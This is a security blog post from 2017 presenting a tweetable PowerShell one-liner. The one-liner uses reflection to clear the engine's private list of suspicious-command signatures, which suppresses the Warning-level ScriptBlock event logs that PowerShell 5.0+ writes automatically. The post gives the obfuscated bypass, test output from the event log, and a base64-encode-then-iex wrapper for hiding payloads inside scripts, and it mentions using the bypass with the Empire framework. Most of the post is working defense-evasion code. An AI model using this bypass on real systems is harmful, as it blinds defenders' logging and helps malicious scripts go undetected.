---
layout: post
title: "Bypass for PowerShell ScriptBlock Warning Logging of Suspicious Commands"
date: 2017-5-02 00:00:01 -0600
tags: PowerShell
---

## tl;dr

PowerShell 5.0+ automatically logs Warning level ScriptBlock EventLogs when executing "suspicious" commands commonly associated with malware, *even if ScriptBlock logging is not enabled*. This is a one-line bypass of that logging capability:

```
PS> [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
```

To ensure no Warning logs are created when including this bypass within a script, you also need to encode (or otherwise obfuscate) your desired payload so that it doesn't appear in **the same** ScriptBlock as the bypass. This encoding will eventually be unraveled in the next ScriptBlock, but to ensure our bypass is executed prior to scanning for suspicious strings in our payload, it must appear encoded in **the same** ScriptBlock as the bypass. For example, we would take our payload and encode it:

```
PS> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('"<My suspicious NonPublic payload>"'))
IgA8AE0AeQAgAHMAdQBzAHAAaQBjAGkAbwB1AHMAIABOAG8AbgBQAHUAYgBsAGkAYwAgAHAAYQB5AGwAbwBhAGQAPgAiAA==
```

Then our bypass and payload execution would become:

```
[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA8AE0AeQAgAHMAdQBzAHAAaQBjAGkAbwB1AHMAIABOAG8AbgBQAHUAYgBsAGkAYwAgAHAAYQB5AGwAbwBhAGQAPgAiAA=='))|iex
```

(Thanks to [@danielhbohannon](https://twitter.com/danielhbohannon) for the tip!)

## Details

This bypass may look familiar to you. It was inspired by Matt Graeber's tweetable, one-line AMSI bypass:

![AMSI Bypass]({{site.baseurl}}/assets/images/graeber-amsi-bypass.png)

I figured his method of using reflection to interact with the AmsiUtils class and alter nonpublic, static fields could probably be applied in other nefarious ways. I've been down in a rabbithole of PowerShell obfuscation and ScriptBlock logging lately, and just recently discovered that PowerShell 5.0+ automatically logs "suspicious" commands commonly associated with malware to ScriptBlock logs with a **warning level** (even if ScriptBlock logging is not enabled!). This is a great source of evidence for defenders, so naturally I wanted to try to break it!

Digging through the open-source PowerShell 6.0 GitHub page, what I found is that PowerShell defines a list of strings that are considered "suspicious" and does some string matching to see if a given ScriptBlock contains any of them.

![Suspicious Strings]({{site.baseurl}}/assets/images/suspicious-strings.png)

[Check out the code yourself!](https://github.com/PowerShell/PowerShell/blob/v6.0.0-alpha.18/src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs#L1612-L1660)

Let's see if we can find a similar field in PowerShell 5! Using reflection, let's get a list of the nonpublic, static fields defined in the ScriptBlock class:
```
PS> [ScriptBlock].GetFields('NonPublic,Static')


Name                    : signatures
MetadataToken           : 67114066
FieldHandle             : System.RuntimeFieldHandle
Attributes              : Private, Static
FieldType               : System.Collections.Generic.HashSet`1[System.String]
MemberType              : Field
ReflectedType           : System.Management.Automation.ScriptBlock
DeclaringType           : System.Management.Automation.ScriptBlock
Module                  : System.Management.Automation.dll
IsPublic                : False
IsPrivate               : True
IsFamily                : False
IsAssembly              : False
IsFamilyAndAssembly     : False
IsFamilyOrAssembly      : False
IsStatic                : True
IsInitOnly              : False
IsLiteral               : False
IsNotSerialized         : False
IsSpecialName           : False
IsPinvokeImpl           : False
IsSecurityCritical      : True
IsSecuritySafeCritical  : False
IsSecurityTransparent   : False
CustomAttributes        : {}

...
(output truncated for brevity, you will see other fields)
```

This appears to be the field we are after. You'll notice the `Attribute` property is `Private, Static`. What we learned from Matt's AMSI bypass is that we can alter these private *static* fields using reflection! First, let's test if we can just grab that `signatures` value and see what's inside:

```
PS> [ScriptBlock].GetField('signatures','NonPublic,Static').GetValue($null) | Select -First 10
Add-Type
DllImport
DefineDynamicAssembly
DefineDynamicModule
DefineType
DefineConstructor
CreateType
DefineLiteral
DefineEnum
DefineField
```

Great, we have confirmed that we are able to successfully grab the `signatures` field and we can see all the "suspicious" strings PowerShell is looking for. Now we just need to alter this value to a value we would prefer. How about an empty set?

```
PS> [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
PS> [ScriptBlock].GetField('signatures','NonPublic,Static').GetValue($null)
PS> 
```

It worked! Just one small problem...

```
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Where {$_.LevelDisplayName -eq 'Warning'} | Measure

Count     : 0
Average   :
Sum       :
Maximum   :
Minimum   :
Property  :

PS> [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Where {$_.LevelDisplayName -eq 'Warning'} | Measure

Count     : 1
Average   :
Sum       :
Maximum   :
Minimum   :
Property  :

```

**:(**

You may have noticed in that original list of signatures both `GetField` and `NonPublic` are flagged as suspicious. This is getting logged to a ScriptBlock warning level log **before** our bypass takes effect. If only I knew a tool that makes string matching PowerShell code difficult...

I actually ended up obfuscating this by hand, but I took obfuscation principles learned from [Invoke-Obfuscation](https;//github.com/danielbohannon/Invoke-Obfuscation) and put them to work on these two signatures to get the final result.

```
PS> [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
```

And for completeness...

```
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Where {$_.LevelDisplayName -eq 'Warning'} | Measure

Count     : 0
Average   :
Sum       :
Maximum   :
Minimum   :
Property  :

PS> "NonPublic"
NonPublic
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Where {$_.LevelDisplayName -eq 'Warning'} | Measure

Count     : 1
Average   :
Sum       :
Maximum   :
Minimum   :
Property  :

PS> [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
PS> "NonPublic"
NonPublic
PS> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Where {$_.LevelDisplayName -eq 'Warning'} | Measure

Count     : 1
Average   :
Sum       :
Maximum   :
Minimum   :
Property  :
```

And the final character count is 126 characters, so it is tweetable :)

![Warning Log Bypass]({{site.baseurl}}/assets/images/warning-log-bypass-tweet.png)

## ~~One Last Problem To Solve~~

~~So this all works great when using it at an interactive PowerShell prompt, the problem comes when trying to script it. My first thought was to throw this into Empire to test how effective it was. There are 2 main problems: One, if the one-liner bypass gets bundled with other code by PowerShell into a larger ScriptBlock, that code following the bypass could be found to be "suspicious" prior to the bypass taking effect. This is because the code is checked for suspicious strings prior to execution of the *entire* ScriptBlock *including the bypass*. Two, Empire creates a new PowerShell runspace for each module that is executed. When new runspaces are created, the runspace gets a newly initialized `signatures` variable that will catch strings in the given module. A way to combat this would be to prepend all modules with the bypass, but then again we run into problem #1 with code getting bundled with the bypass into a single ScriptBlock and still being scanned prior to execution of the bypass.~~

~~Given the flexibility of PowerShell in general, and my relatively little experience with the language, I'm sure there must be some solution to this problem. So this will serve as a call for help to all you PowerShell wizards out there! :)~~

The PowerShell wizard, Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)), came through with a solution to the previously mentioned problem with scripting this bypass. We can simply encode our desired payload, and then decode and invoke it during execution. Originally I didn't believe this would work since encoding techniques, such as Base64, are unraveled prior to hitting ScriptBlock logs and would be scanned just the same. But we are okay with our payload hitting ScriptBlocks logs, *as long as it is post-bypass*. And if we encode the payload, the bypass will be executed just **before** that encoding is unraveled and our payload is scanned for suspicious scripts. This allows us to bypass the Warning-level logs within any given PowerShell script, so long as it appears encoded in the script and it is decoded/invoked during execution. Thanks Daniel!

## More Ideas

After using obfuscation to avoid Warning level logs for `GetField` and `NonPublic`, I realized this concept could probably be applied to *all* of the suspicious strings PowerShell is looking for. I think it would be fun to script this, and we could avoid Warning level logs even if this bypass is ever fixed (considering Matt's AMSI bypass still works a year later, this is doubtful to come soon) ~~or no solution is found to the last problem I am facing in scripting the bypass~~. I will try to write a script to automate obfuscation for this, and post it when complete.

Also, it seems likely that using reflection to alter nonpublic fields has the potential for more abuse!